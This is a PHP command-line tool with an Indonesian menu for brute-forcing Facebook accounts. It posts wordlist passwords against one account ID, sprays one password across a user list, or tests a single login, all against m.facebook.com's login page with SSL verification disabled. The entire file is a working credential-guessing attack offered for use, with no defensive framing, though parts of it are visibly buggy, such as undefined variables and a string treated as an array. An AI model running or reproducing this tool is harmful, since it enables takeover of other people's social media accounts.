<?php

@system('clear');
error_reporting(0);

$blue="\033[1;34m";
$cyan="\033[1;36mm";
$green="\033[1;32m";
$okegreen="\033[92m";
$lightgreen="\033[1;32m";
$white="\033[1;37m";
$red="\033[1;31m";
$yellow="\033[1;33m";

$banner="\n $red
  _____                         ___.                     __
_/ ____\_____     ____    ____  \_ |__    ____    ____  |  | __
\   __\ \__  \  _/ ___\ _/ __ \  | __ \  /  _ \  /  _ \ |  |/ /
 |  |    / __ \_\  \___ \  ___/  | \_\ \(  <_> )(  <_> )|    <
 |__|   (____  / \___  > \___  > |___  / \____/  \____/ |__|_ \
             \/      \/      \/      \/                      \/
 $white " ;
function fb($user, $pass) {
	$fileua = 'user-agents.txt';
	$useragent = $fileua[rand(0, count($fileua) - 1)];
	$cookie = 'cookie.txt';
	touch($kuki);
$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/login.php');
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$user.'&pass='.$pass.'&login=Login');
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
	curl_setopt($ch, CURLOPT_REFERER, 'http://m.facebook.com');
	$output = curl_exec($ch) or die('Can\'t access '.$url);
	if(stristr($output, '<title>Facebook</title>') || stristr($output, 'id="checkpointSubmitButton"')) {
		return TRUE;
	} else {
		return FALSE;
	}
}
function mfb($pass, $user) {
	$fileua = 'user-agents.txt';
	$useragent = $fileua[rand(0, count($fileua) - 1)];
  $cookie = 'cookie.txt';
  touch ($cookie);
$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/login.php');
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'pass='.$pass.'&email='.$user.'&login=Login');
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
	curl_setopt($ch, CURLOPT_REFERER, 'https://m.facebook.com');
	$output = curl_exec($ch) or die('Can\'t access '.$url);
	if(stristr($output, '<title>Facebook</title>') || stristr($output, 'id="checkpointSubmitButton"')) {
		return TRUE;
	} else {
		return FALSE;
	}
}
function bf() {
  $file = $_SERVER[argv][0];
  echo "\n\e[1;32m[+]\e[1;34m masukan id : \e[0m";
  $user=trim(fgets(STDIN));
  echo "\n\e[1;32m[+]\e[1;34m masukan passlist : \e[0m";
  $wordlist=trim(fgets(STDIN));
  if(!empty($user) && !empty($wordlist)) {
    $passlist = file($wordlist);
    $passcount = count($passlist);
    print "\n\e[1;33m[!] \e[1;32mmengecheck \e[1;35m".$passcount." \e[1;33mpassword..\n\e[0m";
    foreach($passlist as $password) {
      $pass = substr($password, 0, strlen($password) - 1);
      if(fb(urlencode($user), urlencode($pass))) {
        print "\n\e[1;33m".$pass." : \e[1;32mOK\n\e[0m";
      } else {
        print "\n\e[1;33m".$pass." : \e[1;31mError\n\e[0m";
      }
    }
  }
}

function mbf() {
  $file = $_SERVER[argv][0];
  echo "\n\e[1;32m[+] \e[1;34mmasukan password : \e[0m";
  $pass=trim(fgets(STDIN));
  echo "\n\e[1;32m[+] \e[1;34mmasukan userlist : \e[0m";
  $wordlist=trim(fgets(STDIN));
  if(!empty($pass) && !empty($wordlist)) {
    $passlist = file($wordlist);
    $passcount = count($passlist);
    print "\n\e[1;33m[!] \e[1;32mMengecheck \e[1;35m".$passcount." \e[1;33muser..\n\e[0m";
    foreach($passlist as $password) {
      $user = substr($password, 0, strlen($password) - 1);
      if(mfb(urlencode($pass), urlencode($user))) {
        print "\n\e[1;33m".$user." : \e[1;32mOK\n";
      } else {
        print "\n\e[1;33m".$user." : \e[1;31mError\n\e[0m";
      }
    }
  }
}

function login(){
  $file = $_SERVER[argv][0];
  echo "\n\e[1;32m[+]\e[1;34m id : \e[0m";
  $user=trim(fgets(STDIN));
  echo "\n\e[1;32m[+]\e[1;34m password : \e[0m";
  $pass=trim(fgets(STDIN));
  print "\n\e[1;33m Sedang Login.....\n";
  if(fb(urlencode($user), urlencode($pass))) {
    print "\n\e[1;32mLogin Sukses";
  }else{
    print "\n\e[1;31mlogin gagal\n";
  }
}

print $banner;
print "\n
\033[1;33m[1]\033[1;34m Bruteforce Facebook
\033[1;33m[2]\033[1;34m Multi Bruteforce Facebook
\033[1;33m[3]\033[1;34m Login Facebook
\033[1;33m[4] \033[1;31mExit\n";

echo " \n\033[1;32m[*] \033[1;33mInput Nomor : \033[0m";
$nomor=trim(fgets(STDIN));
if($nomor=="1"){
  bf();
}elseif($nomor=="2"){
  mbf();
}elseif($nomor=="3"){
  login();
}elseif($nomor=="4"){
  @system('exit');
}else{
  print "\033[1;31mcommand not found";
}
?>
